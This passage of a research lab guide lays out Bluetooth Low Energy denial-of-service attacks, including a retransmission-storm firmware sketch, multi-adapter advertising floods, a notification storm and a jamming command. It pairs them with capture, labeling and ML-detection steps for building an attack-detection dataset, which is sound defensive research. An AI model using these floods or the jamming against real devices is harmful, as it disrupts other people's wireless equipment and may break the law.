#### 4.2.4 Pseudocode: Retransmission Storm (Requires Custom Firmware)

```c
/**
 * retransmission_storm.c - Manipulate SN/NESN at LL layer
 * Hardware: nRF52840
 * Firmware: Custom bare-metal (bypass SoftDevice)
 * 
 * WARNING: This requires writing directly to nRF52840 RADIO peripheral
 * registers. Not possible with SoftDevice (SoftDevice owns RADIO).
 * Use this only for research, requires significant firmware development.
 */

#include <nrf.h>

#define LL_DATA_PDU_HEADER_LEN 2

typedef struct {
    uint8_t llid : 2;   // Link Layer ID
    uint8_t nesn : 1;   // Next Expected Sequence Number
    uint8_t sn : 1;     // Sequence Number
    uint8_t md : 1;     // More Data
    uint8_t rfu : 3;    // Reserved
    uint8_t length;     // Payload length
} ll_data_pdu_header_t;

void send_ll_data_with_fixed_sn(uint8_t *payload, uint8_t len) {
    static uint8_t fixed_sn = 0;  // Never increment
    
    uint8_t pdu[LL_DATA_PDU_HEADER_LEN + len];
    ll_data_pdu_header_t *header = (ll_data_pdu_header_t *)pdu;
    
    header->llid = 0x02;  // Start of L2CAP message
    header->nesn = 1;     // Always 1 (never acknowledge victim)
    header->sn = fixed_sn;  // Fixed SN (forces victim retransmissions)
    header->md = 0;
    header->rfu = 0;
    header->length = len;
    
    memcpy(&pdu[LL_DATA_PDU_HEADER_LEN], payload, len);
    
    // Configure nRF52840 RADIO peripheral
    NRF_RADIO->PCNF0 = /* configure packet format */;
    NRF_RADIO->PCNF1 = /* configure whitening, CRC */;
    NRF_RADIO->PACKETPTR = (uint32_t)pdu;
    
    // Transmit
    NRF_RADIO->TASKS_START = 1;
    while (NRF_RADIO->EVENTS_END == 0);  // Wait for TX complete
    
    // NOTE: Don't increment fixed_sn
    // Victim will see SN=0 repeatedly, retransmit its own packets
}
```

**Note:** This requires significant low-level development. For most research, use SoftDevice-based attacks (3.3.x series).

---

### 4.3 Hybrid Attacks (Multi-Device Coordination)

#### Attack 4.3.1: Distributed Advertising Flood

**Description:** Use multiple USB Bluetooth adapters to increase aggregate advertising rate.

**Hardware:** Laptop with 3-4 USB Bluetooth dongles

**Implementation:**
```python
#!/usr/bin/env python3
"""
distributed_adv_flood.py - Multi-adapter advertising flood
"""

import multiprocessing
import time
from adv_flood import advertising_flood  # From 4.1.2

def worker(device_id, rate_hz, duration_s):
    advertising_flood(device_id, rate_hz, duration_s)

if __name__ == "__main__":
    # List of HCI device IDs (hci0, hci1, hci2, hci3)
    devices = [0, 1, 2, 3]
    rate_per_device = 10  # Hz
    duration = 30  # seconds
    
    processes = []
    
    for dev_id in devices:
        p = multiprocessing.Process(target=worker, args=(dev_id, rate_per_device, duration))
        p.start()
        processes.append(p)
    
    # Wait for all to complete
    for p in processes:
        p.join()
    
    print(f"Aggregate rate: {rate_per_device * len(devices)} Hz")
```

**Expected Result:**
- 4 adapters × 10 Hz = 40 Hz aggregate advertising rate
- Reduces per-adapter load, avoids controller rate-limiting

---

#### Attack 4.3.2: nRF Peripheral + Laptop Central Attack

**Description:** nRF52840 acts as malicious peripheral (notification storm), laptop connects as central.

**Hardware:** nRF52840 (peripheral) + Laptop (central)

**nRF Firmware (Pseudocode):**
```c
// Peripheral with notification storm
void peripheral_notification_storm(void) {
    // Advertise with custom service
    start_advertising();
    
    // Wait for central connection
    wait_for_connection();
    
    // Send notifications at max rate
    uint8_t notification_data[512];
    memset(notification_data, 0xAA, 512);
    
    while (connected) {
        bt_gatt_notify(conn, characteristic_handle, notification_data, 512);
        k_yield();  // No delay
    }
}
```

**Laptop Script (Pseudocode):**
```python
# Laptop connects and enables notifications
async def receive_notification_storm(peripheral_addr):
    client = BleakClient(peripheral_addr)
    await client.connect()
    
    notification_count = 0
    
    def notification_handler(sender, data):
        nonlocal notification_count
        notification_count += 1
        if notification_count % 100 == 0:
            print(f"Received {notification_count} notifications")
    
    # Enable notifications
    await client.start_notify("00002a37-0000-1000-8000-00805f9b34fb", notification_handler)
    
    # Let storm run
    await asyncio.sleep(60)
    
    await client.disconnect()
    print(f"Total notifications: {notification_count}")
```

---

## 5. Capture & Dataset Generation Pipeline

### 5.1 Capture Infrastructure

**Required Tools:**
- **Ubertooth One:** Over-the-air packet capture
- **btmon:** HCI-level logging on attacker/victim
- **Wireshark:** PCAP analysis
- **Python scripts:** Metadata generation, orchestration

**Capture Setup Diagram:**
```
Attacker (Laptop/nRF)
  ├─ HCI layer → btmon -w attacker_hci.log
  └─ Application → attack script logs

           ↓ ↑ (BLE radio)

Ubertooth One → ubertooth-btle -f -c air_capture.pcap

           ↓ ↑ (BLE radio)

Victim (RPi5/Phone/IoT)
  ├─ HCI layer → btmon -w victim_hci.log (if accessible)
  ├─ Application → victim metrics script
  └─ System → dmesg, CPU/memory logs
```

---

### 5.2 Orchestrator Script (Full Implementation)

```python
#!/usr/bin/env python3
"""
capture_orchestrator.py - Automate capture + attack + metadata
"""

import subprocess
import json
import time
import os
import sys
from datetime import datetime

def start_capture(trial_dir):
    """Start Ubertooth and btmon captures"""
    captures = {}
    
    # Ubertooth capture (over-the-air)
    captures['ubertooth'] = subprocess.Popen([
        'ubertooth-btle', '-f',
        '-c', f'{trial_dir}/air_capture.pcap'
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # btmon on attacker interface (HCI)
    captures['btmon_attacker'] = subprocess.Popen([
        'sudo', 'btmon', '-i', 'hci0',
        '-w', f'{trial_dir}/attacker_hci.log'
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # Optional: btmon on victim (if accessible)
    # captures['btmon_victim'] = subprocess.Popen([...])
    
    time.sleep(2)  # Warmup time
    return captures

def stop_capture(captures):
    """Stop all capture processes gracefully"""
    for name, proc in captures.items():
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
    
    time.sleep(1)  # Allow file flush

def run_attack(attack_script, attack_args):
    """Execute attack script"""
    cmd = [attack_script] + attack_args
    result = subprocess.run(cmd, capture_output=True, text=True)
    return result.returncode, result.stdout, result.stderr

def get_system_info():
    """Collect attacker system information"""
    info = {}
    
    # BlueZ version
    try:
        result = subprocess.run(['bluetoothd', '--version'], capture_output=True, text=True)
        info['bluez_version'] = result.stdout.strip()
    except:
        info['bluez_version'] = 'unknown'
    
    # Kernel version
    result = subprocess.run(['uname', '-r'], capture_output=True, text=True)
    info['kernel_version'] = result.stdout.strip()
    
    # HCI adapter info
    result = subprocess.run(['hciconfig', '-a', 'hci0'], capture_output=True, text=True)
    info['hci_adapter'] = result.stdout
    
    # Ubertooth version
    try:
        result = subprocess.run(['ubertooth-util', '-v'], capture_output=True, text=True)
        info['ubertooth_version'] = result.stdout.strip()
    except:
        info['ubertooth_version'] = 'unknown'
    
    return info

def orchestrate_trial(trial_id, output_dir, attack_config):
    """
    Run a single attack trial with captures
    
    attack_config = {
        'attack_name': 'att_write_flood',
        'script': './att_write_flood.py',
        'args': ['AA:BB:CC:DD:EE:FF', '0000ffe1-...', '50', '30', '512'],
        'description': 'ATT Write Without Response at 50Hz',
        'victim_addr': 'AA:BB:CC:DD:EE:FF',
        'attacker_addr': 'XX:YY:ZZ:WW:VV:UU'
    }
    """
    
    trial_dir = os.path.join(output_dir, f'trial_{trial_id:03d}')
    os.makedirs(trial_dir, exist_ok=True)
    
    print(f"\n{'='*60}")
    print(f"Trial {trial_id}: {attack_config['attack_name']}")
    print(f"{'='*60}")
    
    # Start captures
    print("Starting captures...")
    captures = start_capture(trial_dir)
    
    # Run attack
    print(f"Running attack: {attack_config['description']}")
    start_time = datetime.now()
    
    returncode, stdout, stderr = run_attack(attack_config['script'], attack_config['args'])
    
    end_time = datetime.now()
    print(f"Attack completed with return code: {returncode}")
    
    # Stop captures
    print("Stopping captures...")
    stop_capture(captures)
    
    # Write metadata
    metadata = {
        'trial_id': trial_id,
        'attack_type': attack_config['attack_name'],
        'attack_description': attack_config['description'],
        'start_time': start_time.isoformat(),
        'end_time': end_time.isoformat(),
        'duration_seconds': (end_time - start_time).total_seconds(),
        'attack_script': attack_config['script'],
        'attack_args': attack_config['args'],
        'victim_address': attack_config.get('victim_addr', 'unknown'),
        'attacker_address': attack_config.get('attacker_addr', 'unknown'),
        'attack_returncode': returncode,
        'attack_stdout': stdout,
        'attack_stderr': stderr,
        'system_info': get_system_info(),
        'capture_files': {
            'air_pcap': f'{trial_dir}/air_capture.pcap',
            'attacker_hci': f'{trial_dir}/attacker_hci.log',
        }
    }
    
    with open(f'{trial_dir}/metadata.json', 'w') as f:
        json.dump(metadata, f, indent=2)
    
    print(f"Metadata written to {trial_dir}/metadata.json")
    print(f"Trial {trial_id} complete\n")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: sudo python3 capture_orchestrator.py <config.json>")
        sys.exit(1)
    
    config_file = sys.argv[1]
    
    with open(config_file, 'r') as f:
        config = json.load(f)
    
    output_dir = config['output_dir']
    os.makedirs(output_dir, exist_ok=True)
    
    for i, attack_config in enumerate(config['attacks'], start=1):
        orchestrate_trial(i, output_dir, attack_config)
    
    print("\nAll trials complete!")
```

**Configuration File Example (config.json):**
```json
{
  "output_dir": "./ble_attack_dataset/captures",
  "attacks": [
    {
      "attack_name": "benign_baseline",
      "script": "./benign_traffic.py",
      "args": ["AA:BB:CC:DD:EE:FF", "60"],
      "description": "Benign GATT interactions for 60s",
      "victim_addr": "AA:BB:CC:DD:EE:FF",
      "attacker_addr": "XX:YY:ZZ:WW:VV:UU"
    },
    {
      "attack_name": "att_write_flood_10hz",
      "script": "./att_write_flood.py",
      "args": ["AA:BB:CC:DD:EE:FF", "0000ffe1-0000-1000-8000-00805f9b34fb", "10", "30", "512"],
      "description": "ATT Write Without Response at 10Hz",
      "victim_addr": "AA:BB:CC:DD:EE:FF",
      "attacker_addr": "XX:YY:ZZ:WW:VV:UU"
    },
    {
      "attack_name": "att_write_flood_50hz",
      "script": "./att_write_flood.py",
      "args": ["AA:BB:CC:DD:EE:FF", "0000ffe1-0000-1000-8000-00805f9b34fb", "50", "30", "512"],
      "description": "ATT Write Without Response at 50Hz",
      "victim_addr": "AA:BB:CC:DD:EE:FF",
      "attacker_addr": "XX:YY:ZZ:WW:VV:UU"
    }
  ]
}
```

**Usage:**
```bash
sudo python3 capture_orchestrator.py config.json
```

---

### 5.3 Dataset Structure

```
ble_attack_dataset/
├── captures/
│   ├── benign/
│   │   ├── trial_001/
│   │   │   ├── air_capture.pcap
│   │   │   ├── attacker_hci.log
│   │   │   ├── victim_hci.log (if available)
│   │   │   ├── victim_metrics.json
│   │   │   └── metadata.json
│   │   ├── trial_002/
│   │   └── ...
│   │
│   ├── att_write_flood_10hz/
│   │   ├── trial_001/
│   │   ├── trial_002/
│   │   └── ... (10 trials)
│   │
│   ├── att_write_flood_50hz/
│   │   └── ... (10 trials)
│   │
│   ├── adv_flood_10hz/
│   ├── l2cap_param_update_storm/
│   ├── connection_request_flood/
│   └── ... (one directory per attack type)
│
├── preprocessed/
│   ├── features_per_packet.csv
│   ├── features_per_window_1s.csv
│   ├── features_per_window_5s.csv
│   └── labels.csv
│
├── analysis/
│   ├── packet_rate_comparison.png
│   ├── inter_arrival_distribution.png
│   └── attack_success_rate.csv
│
├── models/
│   ├── detection_model_v1.h5
│   ├── training_logs/
│   └── evaluation_metrics.json
│
└── README.md
```

---

### 5.4 Feature Extraction (Pseudocode)

```python
def extract_features_from_pcap(pcap_file, window_size_s=1.0):
    """
    Extract ML features from BLE PCAP
    
    Returns: DataFrame with columns:
    - timestamp
    - pdu_type_adv_ind_count
    - pdu_type_scan_req_count
    - pdu_type_ll_data_count
    - avg_packet_size
    - std_packet_size
    - avg_inter_arrival_time_ms
    - std_inter_arrival_time_ms
    - att_opcode_0x52_count (Write Without Response)
    - att_opcode_0x12_count (Write Request)
    - l2cap_cid_0x0004_count (ATT)
    - l2cap_cid_0x0005_count (Signaling)
    - unique_adv_addr_count
    - rssi_mean
    - rssi_std
    - retransmission_count (SN/NESN analysis)
    """
    
    packets = read_pcap(pcap_file)  # Use scapy or pyshark
    
    windows = []
    current_window_start = packets[0].timestamp
    current_window_packets = []
    
    for pkt in packets:
        if pkt.timestamp - current_window_start >= window_size_s:
            # Process current window
            features = compute_window_features(current_window_packets)
            features['timestamp'] = current_window_start
            windows.append(features)
            
            # Start new window
            current_window_start = pkt.timestamp
            current_window_packets = []
        
        current_window_packets.append(pkt)
    
    # Process last window
    if current_window_packets:
        features = compute_window_features(current_window_packets)
        features['timestamp'] = current_window_start
        windows.append(features)
    
    return pd.DataFrame(windows)

def compute_window_features(packets):
    """Compute features for a single time window"""
    features = {}
    
    # Packet counts by type
    features['total_packets'] = len(packets)
    features['pdu_type_adv_ind_count'] = count_pdu_type(packets, 0x0)
    features['pdu_type_ll_data_count'] = count_pdu_type(packets, LL_DATA)
    features['att_opcode_0x52_count'] = count_att_opcode(packets, 0x52)
    
    # Timing features
    inter_arrivals = [packets[i+1].timestamp - packets[i].timestamp 
                      for i in range(len(packets)-1)]
    features['avg_inter_arrival_ms'] = np.mean(inter_arrivals) * 1000
    features['std_inter_arrival_ms'] = np.std(inter_arrivals) * 1000
    
    # Size features
    sizes = [len(pkt) for pkt in packets]
    features['avg_packet_size'] = np.mean(sizes)
    features['std_packet_size'] = np.std(sizes)
    
    # Address diversity
    adv_addrs = [pkt.adv_addr for pkt in packets if hasattr(pkt, 'adv_addr')]
    features['unique_adv_addr_count'] = len(set(adv_addrs))
    
    # RSSI (if available in capture)
    if hasattr(packets[0], 'rssi'):
        rssi_values = [pkt.rssi for pkt in packets]
        features['rssi_mean'] = np.mean(rssi_values)
        features['rssi_std'] = np.std(rssi_values)
    
    return features
```

---

### 5.5 Labeling Strategy

**Binary Classification:**
```python
labels = {
    'benign': 0,
    'attack': 1
}
```

**Multi-Class Classification:**
```python
labels = {
    'benign': 0,
    'att_write_flood': 1,
    'adv_flood': 2,
    'l2cap_param_update_storm': 3,
    'connection_request_flood': 4,
    'smp_pairing_spam': 5,
    # ... up to N attack types
}
```

**Labels CSV Format:**
```csv
timestamp,trial_id,attack_type,label,rate_hz,duration_s
2025-01-15T10:30:00,001,benign,0,0,60
2025-01-15T10:31:30,002,att_write_flood,1,10,30
2025-01-15T10:32:15,003,att_write_flood,1,50,30
```

---

## 6. Failure Modes & Debugging

### 6.1 Common Failure Modes

#### 6.1.1 Controller Rate Limiting

**Symptoms:**
- Fewer packets appear on air (Ubertooth) than HCI commands sent (btmon)
- No error messages in btmon
- Attack rate plateaus despite increasing script rate

**Detection:**
```bash
# Compare HCI commands vs air packets
btmon -r attacker_hci.log | grep "LE Set Advertising Enable" | wc -l
# vs
tshark -r air_capture.pcap -Y "btle.advertising_header.pdu_type == 0" | wc -l
```

**Mitigation:**
```python
# Rate probing to find threshold
def probe_controller_limit(iface):
    rates = [10, 20, 50, 100, 200]
    
    for rate in rates:
        advertising_flood(iface, rate, duration_s=10)
        # Check: did actual rate match requested rate?
        actual_rate = measure_actual_rate_from_ubertooth()
        
        print(f"Requested: {rate} Hz, Actual: {actual_rate} Hz")
        
        if actual_rate < rate * 0.8:  # 80% threshold
            print(f"Rate limit detected at {rate} Hz")
            return rate
```

---

#### 6.1.2 HCI Queue Overflow

**Symptoms:**
- `dmesg` shows "Bluetooth: hci0: ACL packet for unknown connection handle"
- btmon shows command errors
- Interface resets (`hci0` disappears, reappears)

**Detection:**
```bash
dmesg | grep -i bluetooth | grep -i error
journalctl -u bluetooth | grep -i overflow
```

**Mitigation:**
```python
# Backoff and retry pattern
def robust_hci_send(sock, command, max_retries=3):
    for attempt in range(max_retries):
        try:
            sock.send(command)
            return True
        except OSError as e:
            if e.errno == 105:  # No buffer space available
                print(f"HCI queue full, backing off {2**attempt}s")
                time.sleep(2 ** attempt)
            else:
                raise
    return False
```

---

#### 6.1.3 BlueZ Stack Interference

**Symptoms:**
- Raw HCI commands ignored
- `bluetoothd` logs show "Command not allowed"
- Advertising data reverts to system-set values

**Detection:**
```bash
sudo systemctl status bluetooth
# Check if bluetoothd is running and interfering
```

**Mitigation:**
```bash
# Stop bluetoothd before raw HCI experiments
sudo systemctl stop bluetooth

# Bring interface down and up manually
sudo hciconfig hci0 down
sudo hciconfig hci0 up

# After experiment, restart
sudo systemctl start bluetooth
```

---

#### 6.1.4 Thermal Throttling (RPi5 Specific)

**Symptoms:**
- Attack rate decreases over time
- `vcgencmd measure_temp` shows >80°C
- `vcgencmd get_throttled` shows non-zero

**Detection:**
```bash
vcgencmd measure_temp
vcgencmd get_throttled
# 0x0: No throttling
# 0x1: Under-voltage detected
# 0x2: Arm frequency capped
# 0x4: Currently throttled
```

**Mitigation:**
- Active cooling (fan)
- Heatsinks on BCM chip
- Use external USB Bluetooth adapter (offload heat from RPi)

---

### 6.2 Debugging Workflow

**Step 1: Verify Connectivity**
```bash
# Can you connect normally?
bluetoothctl
[bluetooth]# scan on
[bluetooth]# connect AA:BB:CC:DD:EE:FF
```

**Step 2: Check HCI Layer**
```bash
# Start btmon in one terminal
sudo btmon

# Run attack in another terminal
python3 att_write_flood.py ...

# Verify: Do you see HCI commands in btmon?
# Verify: Do you see errors/NACKs?
```

**Step 3: Check Air (Ubertooth)**
```bash
# Start Ubertooth capture
ubertooth-btle -f -c debug.pcap

# Run attack
python3 adv_flood.py ...

# Analyze: Do packets appear in Wireshark?
wireshark debug.pcap
```

**Step 4: Correlation Analysis**
```python
# Compare HCI commands sent vs packets on air
hci_count = count_hci_commands('attacker_hci.log', opcode=0x200A)
air_count = count_air_packets('air_capture.pcap', pdu_type=0x0)

efficiency = air_count / hci_count * 100
print(f"Controller efficiency: {efficiency:.1f}%")
```

---

## 7. Complete Coding Requirements

### 7.1 Python Skills

#### 7.1.1 Core Language
- **Async/await:** For non-blocking BLE operations (bleak library)
- **Multiprocessing:** Parallel attacks across adapters
- **Socket programming:** Raw Bluetooth sockets (HCI, L2CAP)
- **Struct module:** Pack/unpack binary protocol data
- **Exception handling:** Robust error recovery in attacks

**Example:**
```python
import struct
import asyncio
import socket

# Pack HCI command
opcode = (0x08 << 10) | 0x000A
cmd = struct.pack('<BHB', 0x01, opcode, 1) + b'\x01'

# Async BLE client
async def attack():
    async with BleakClient(addr) as client:
        await client.write_gatt_char(uuid, data, response=False)

# Raw socket
sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
```

#### 7.1.2 Libraries

| Library | Purpose | Installation |
|---------|---------|--------------|
| **bleak** | High-level BLE GATT client (ATT/GATT attacks) | `pip3 install bleak` |
| **pybluez** | Low-level Bluetooth (L2CAP sockets, rfcomm) | `pip3 install pybluez` |
| **scapy** | Packet crafting/analysis (BLE layer support) | `pip3 install scapy` |
| **pyshark** | Wireshark Python interface (PCAP parsing) | `pip3 install pyshark` |
| **pandas** | Feature extraction, dataset manipulation | `pip3 install pandas` |
| **numpy** | Statistical feature computation | `pip3 install numpy` |

**Bleak Usage:**
```python
from bleak import BleakClient, BleakScanner

# Discover devices
devices = await BleakScanner.discover()

# Connect and write
async with BleakClient(address) as client:
    services = await client.get_services()
    await client.write_gatt_char(uuid, data, response=False)
```

**Scapy BLE:**
```python
from scapy.all import *
from scapy.layers.bluetooth import *

# Craft BLE advertising packet
pkt = BTLE() / BTLE_ADV() / BTLE_ADV_IND(AdvA='AA:BB:CC:DD:EE:FF')
```

---

### 7.2 C/C++ Skills (for nRF52840)

#### 7.2.1 Core Concepts
- **Embedded C:** No standard library, constrained memory
- **ARM Cortex-M4:** Register-level programming (nRF52840 MCU)
- **RTOS (Zephyr/FreeRTOS):** Threading, semaphores, timers
- **Bluetooth SoftDevice:** Nordic's BLE stack API

**Key Topics:**
```c
// Pointer manipulation for buffers
uint8_t *buffer = malloc(512);
memcpy(buffer, data, len);

// Bit manipulation for header fields
uint8_t header = (llid << 0) | (nesn << 2) | (sn << 3);

// Callback functions
void on_write_event(ble_gatts_evt_write_t *evt) {
    // Handle write
}

// Interrupts (for low-level radio control)
void RADIO_IRQHandler(void) {
    // Handle radio event
}
```

#### 7.2.2 nRF52840 SDK/Frameworks

| Framework | Complexity | Control | Use Case |
|-----------|-----------|---------|----------|
| **Nordic SDK** | Low | Medium | Standard BLE applications |
| **Zephyr RTOS** | Medium | High | RTOS threading, timing control |
| **Apache Mynewt (NimBLE)** | Medium | High | Full stack access |
| **Bare-metal** | High | Full | Link-layer manipulation |

**Zephyr Example:**
```c
#include <bluetooth/bluetooth.h>
#include <bluetooth/gatt.h>

static struct bt_conn *default_conn;

static void connected(struct bt_conn *conn, uint8_t err) {
    if (err) return;
    default_conn = bt_conn_ref(conn);
    // Start attack
}

BT_CONN_CB_DEFINE(conn_callbacks) = {
    .connected = connected,
    .disconnected = disconnected,
};
```

**Nordic SDK Example:**
```c
#include "ble_gatts.h"

void ble_gatts_evt_write_handler(ble_gatts_evt_t const *p_evt) {
    ble_gatts_evt_write_t const *p_write = &p_evt->params.write;
    
    if (p_write->handle == characteristic_handle) {
        // Process write attack
    }
}
```

---

### 7.3 Shell/System Tools

#### 7.3.1 BlueZ Command-Line Tools

| Tool | Purpose | Example |
|------|---------|---------|
| **hciconfig** | Configure HCI interfaces | `sudo hciconfig hci0 up` |
| **hcitool** | Low-level HCI operations | `sudo hcitool lescan` |
| **btmon** | HCI protocol monitor | `sudo btmon -w capture.log` |
| **bluetoothctl** | Interactive Bluetooth control | `bluetoothctl scan on` |
| **btmgmt** | Bluetooth management interface | `sudo btmgmt info` |
| **gatttool** | GATT operations (deprecated, use bleak) | `gatttool -b AA:BB:CC:DD:EE:FF --char-write -a 0x10 -n AABB` |

**hcitool Advertising:**
```bash
# Enable LE advertising (legacy method)
sudo hcitool -i hci0 cmd 0x08 0x0008 1E 02 01 06 1A FF 4C 00 ...  # Set Adv Data
sudo hcitool -i hci0 cmd 0x08 0x000A 01  # Enable advertising
```

#### 7.3.2 Ubertooth Tools

| Tool | Purpose | Example |
|------|---------|---------|
| **ubertooth-btle** | BLE sniffing | `ubertooth-btle -f -c capture.pcap` |
| **ubertooth-specan** | Spectrum analyzer | `ubertooth-specan` |
| **ubertooth-util** | Utility functions | `ubertooth-util -v` |

**Advanced Ubertooth Usage:**
```bash
# Follow connections (after seeing CONNECT_IND)
ubertooth-btle -f -c capture.pcap

# Advertising channel sniffing only
ubertooth-btle -A 37 -c adv37.pcap  # Channel 37

# Jamming (experimental)
ubertooth-btle -j  # WARNING: May be illegal
```

---

### 7.4 Analysis & Visualization Tools

#### 7.4.1 Wireshark

**BLE Display Filters:**
```
# Advertising packets only
btle.advertising_header.pdu_type == 0

# ATT Write Without Response
btatt.opcode == 0x52

# L2CAP signaling
btl2cap.cid == 0x0005

# Connection Parameter Update Request
btl2cap.cmd_code == 0x12

# SMP pairing
btle_l2cap.cid == 0x0006
```

**Wireshark Columns (Add for BLE analysis):**
- `btle.advertising_address` → AdvAddr
- `btatt.opcode` → ATT Opcode
- `btl2cap.length` → L2CAP Length
- `btle.data_header.length` → LL Data Length
- Custom column: Inter-arrival time (`frame.time_delta`)

#### 7.4.2 Python Data Analysis

```python
import pandas as pd
import matplotlib.pyplot as plt

# Load features
df = pd.read_csv('features_per_window_1s.csv')

# Plot packet rate over time
plt.figure(figsize=(12, 6))
for attack_type in df['attack_type'].unique():
    subset = df[df['attack_type'] == attack_type]
    plt.plot(subset['timestamp'], subset['total_packets'], label=attack_type)

plt.xlabel('Time (s)')
plt.ylabel('Packets per second')
plt.legend()
plt.savefig('packet_rate_comparison.png')
```

---

### 7.5 Machine Learning (Model Training)

**Scikit-learn Example:**
```python
from sklearn.ensemble import RandomForestClassifier
from sklearn.model_selection import train_test_split
from sklearn.metrics import classification_report

# Load features and labels
X = pd.read_csv('features_per_window_1s.csv').drop(['timestamp', 'trial_id'], axis=1)
y = pd.read_csv('labels.csv')['label']

# Split
X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3)

# Train
clf = RandomForestClassifier(n_estimators=100)
clf.fit(X_train, y_train)

# Evaluate
y_pred = clf.predict(X_test)
print(classification_report(y_test, y_pred))
```

**TensorFlow/Keras (LSTM for sequence):**
```python
import tensorflow as tf
from tensorflow.keras.models import Sequential
from tensorflow.keras.layers import LSTM, Dense

# Prepare sequences (e.g., 10-second windows)
X_seq = prepare_sequences(df, window=10)  # Shape: (n_samples, 10, n_features)
y = labels

# Model
model = Sequential([
    LSTM(64, input_shape=(10, n_features)),
    Dense(32, activation='relu'),
    Dense(n_classes, activation='softmax')
])

model.compile(optimizer='adam', loss='sparse_categorical_crossentropy', metrics=['accuracy'])
model.fit(X_seq, y, epochs=20, validation_split=0.2)
```

---

### 7.6 Learning Path (Beginner → Advanced)

#### Week 1-2: Python Basics + BlueZ Exploration
```
Day 1-3: Python async/await, bleak library basics
Day 4-5: Connect to BLE device, read/write characteristics
Day 6-7: Implement first attack (ATT Write flood) with bleak
Day 8-10: Learn HCI command structure, btmon interpretation
Day 11-14: Implement HCI-level attack (advertising flood)
```

**Deliverable:** Working `att_write_flood.py` and `adv_flood.py`

---

#### Week 3-4: Capture & Analysis
```
Day 15-17: Set up Ubertooth, capture benign traffic, analyze in Wireshark
Day 18-20: Implement capture_orchestrator.py, run first dataset (5 attack types, 3 trials each)
Day 21-23: Feature extraction script, label generation
Day 24-28: Train first ML model (Random Forest), evaluate performance
```

**Deliverable:** Dataset with 15 labeled trials, baseline ML model

---

#### Month 2: Advanced Attacks + nRF52840
```
Week 5-6: L2CAP socket programming, L2CAP attacks
Week 7-8: Set up nRF52840 dev environment, flash example firmware
          Implement GATT server on nRF (notification storm)
```

**Deliverable:** L2CAP signaling flood, nRF-based notification attack

---

#### Month 3: Link-Layer Manipulation (Advanced)
```
Week 9-10: Study LL PDU structure, SN/NESN mechanics
           Learn Zephyr RTOS or NimBLE for LL access
Week 11-12: Implement LL-level attack (retransmission storm)
            Requires custom nRF firmware or bare-metal programming
```

**Deliverable:** LL PDU manipulation attack, firmware documentation

---

#### Month 4: Full Dataset + Model Optimization
```
Week 13-14: Expand dataset to 25+ attack types, 10 trials each (250+ captures)
Week 15-16: Implement advanced ML models (LSTM, CNN on packet sequences)
            Hyperparameter tuning, cross-validation
```

**Deliverable:** Production-ready detection model, research paper draft

---

## 8. Lab Recipes (Step-by-Step Weekend Plans)

### 8.1 Weekend 1: First Capture & Attack

**Goal:** Capture benign traffic, run first DoS attack, analyze in Wireshark

**Hardware Needed:** Laptop, Ubertooth One, BLE device (phone or IoT sensor)

**Schedule:**

**Saturday Morning (3 hours):**
```
09:00 - Set up Ubertooth
        sudo apt install ubertooth
        ubertooth-util -v
        
09:30 - Capture benign traffic
        ubertooth-btle -f -c benign_baseline.pcap
        (Let run for 30 minutes while using BLE device normally)
        
10:00 - Analyze in Wireshark
        wireshark benign_baseline.pcap
        - Identify ADV_IND packets
        - Find CONNECT_IND (connection establishment)
        - Examine ATT Read/Write transactions
        
11:00 - Document findings
        - Packet rate (packets/sec)
        - PDU type distribution
        - Connection parameters (interval, latency)
```

**Saturday Afternoon (4 hours):**
```
13:00 - Implement att_write_flood.py (use code from Section 4.1.3)
        
14:00 - Test run (no capture)
        python3 att_write_flood.py <device_addr> <char_uuid> 10 30 512
        Verify device receives writes (app behavior changes)
        
15:00 - Run with capture
        Terminal 1: ubertooth-btle -f -c attack_capture.pcap
        Terminal 2: sudo btmon -w attacker_hci.log
        Terminal 3: python3 att_write_flood.py ...
        
16:00 - Analyze attack capture
        Compare benign vs attack:
        - Packet rate increase
        - ATT 0x52 (Write Without Response) count
        - Inter-arrival time distribution
```

**Sunday (4 hours):**
```
10:00 - Create metadata.json manually for both captures
        (Document attack parameters, timestamps)
        
11:00 - Extract basic features (manual in Wireshark)
        - Count packets by type
        - Measure avg inter-arrival time
        - Note RSSI values
        
12:00 - Write summary report
        - Observations: victim behavior during attack
        - Metrics: packet rates, success rate
        - Failures: controller rate limits, errors
        
13:00 - Plan next weekend: implement capture_orchestrator.py
```

---

### 8.2 Weekend 2: Automated Dataset Generation

**Goal:** Use orchestrator to generate 10 labeled trials

**Saturday (6 hours):**
```
09:00 - Implement capture_orchestrator.py (Section 5.2)
        
11:00 - Create config.json with 10 attack configs:
        - 3 benign baselines
        - 2 att_write_flood (different rates)
        - 2 adv_flood
        - 2 l2cap_param_update_storm
        - 1 connection_request_flood
        
12:00 - Lunch
        
13:00 - Run orchestrator
        sudo python3 capture_orchestrator.py config.json
        (Takes ~1 hour for 10 trials × 30s each + overhead)
        
14:30 - Verify all captures
        ls -lh captures/*/
        Check for air_capture.pcap, attacker_hci.log, metadata.json
        
15:00 - Spot-check PCAPs in Wireshark
        Ensure attacks are visible in captures
```

**Sunday (6 hours):**
```
10:00 - Implement feature extraction script (Section 5.4)
        
12:00 - Run feature extraction on all trials
        python3 extract_features.py --input captures/ --output features.csv
        
13:00 - Create labels.csv
        
14:00 - Train first ML model (scikit-learn Random Forest)
        python3 train_model.py --features features.csv --labels labels.csv
        
15:00 - Evaluate model
        - Accuracy, precision, recall per attack type
        - Confusion matrix
        - Feature importance analysis
        
16:00 - Document results, plan next steps
```

---

### 8.3 Weekend 3: nRF52840 Setup & First Attack

**Goal:** Flash nRF52840, implement GATT server with notification storm

**Saturday (8 hours):**
```
09:00 - Set up Zephyr development environment
        (Follow official Zephyr Getting Started guide)
        
11:00 - Build and flash example "peripheral" sample
        cd ~/zephyrproject/zephyr
        west build -b nrf52840dongle_nrf52840 samples/bluetooth/peripheral
        west flash
        
12:00 - Test: connect from laptop using bluetoothctl
        
13:00 - Lunch
        
14:00 - Modify example to add custom characteristic
        - Service UUID: 0x1234
        - Characteristic UUID: 0x5678
        - Properties: Notify
        
16:00 - Implement notification storm logic
        - On connection, start sending notifications at max rate
        - No delay between notifications
        
17:00 - Build and flash modified firmware
